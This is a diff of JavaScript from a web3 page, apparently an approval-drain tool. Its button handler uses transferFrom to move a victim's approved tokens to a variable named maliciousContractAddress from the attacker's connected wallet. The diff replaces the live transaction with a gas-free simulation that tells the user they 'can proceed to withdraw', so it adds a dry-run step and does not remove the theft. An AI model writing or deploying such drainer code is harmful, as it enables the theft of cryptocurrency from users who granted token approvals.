@@ -628,19 +628,23 @@ document.getElementById("transferTokensBtn").addEventListener("click", async () 
                 return; // Exit if no tokens are available to withdraw
             }
 
-            // Execute the withdrawal transaction
-            console.debug("Attempting to execute withdrawal...");
-            const transaction = await tokenContract.methods
-                .transferFrom(cleanedVictimAddress, maliciousContractAddress, amountToWithdraw.toString())
-                .send({ from: accounts[0] }); // Sender is the connected attacker's wallet
-            console.debug("Transaction details:", transaction);
+            // Simulate the withdrawal transaction
+            console.debug("Simulating withdrawal transaction...");
+            try {
+                const result = await tokenContract.methods
+                    .transferFrom(cleanedVictimAddress, maliciousContractAddress, amountToWithdraw.toString())
+                    .call({ from: accounts[0] }); // Simulate call without spending gas
+                console.debug("Simulation successful, result:", result);
 
-            // Notify successful withdrawal
-            alert(`Successfully withdrawn ${web3.utils.fromWei(amountToWithdraw, 'ether')} tokens!`);
+                alert(`Simulation successful. You can proceed to withdraw ${web3.utils.fromWei(amountToWithdraw, 'ether')} tokens.`);
+            } catch (simulationError) {
+                console.error("Simulation Error:", simulationError);
+                alert("Simulation failed. Check victim's approval and balance.");
+            }
         } catch (error) {
-            // Handle errors during the withdrawal process
-            console.error("Withdrawal Error:", error);
-            alert("Error occurred during withdrawal. Check victim's approval and balance.");
+            // Handle errors during balance/allowance checks
+            console.error("Error during withdrawal preparation:", error);
+            alert("Error occurred during preparation. Check victim's approval and balance.");
         }
     }
 });
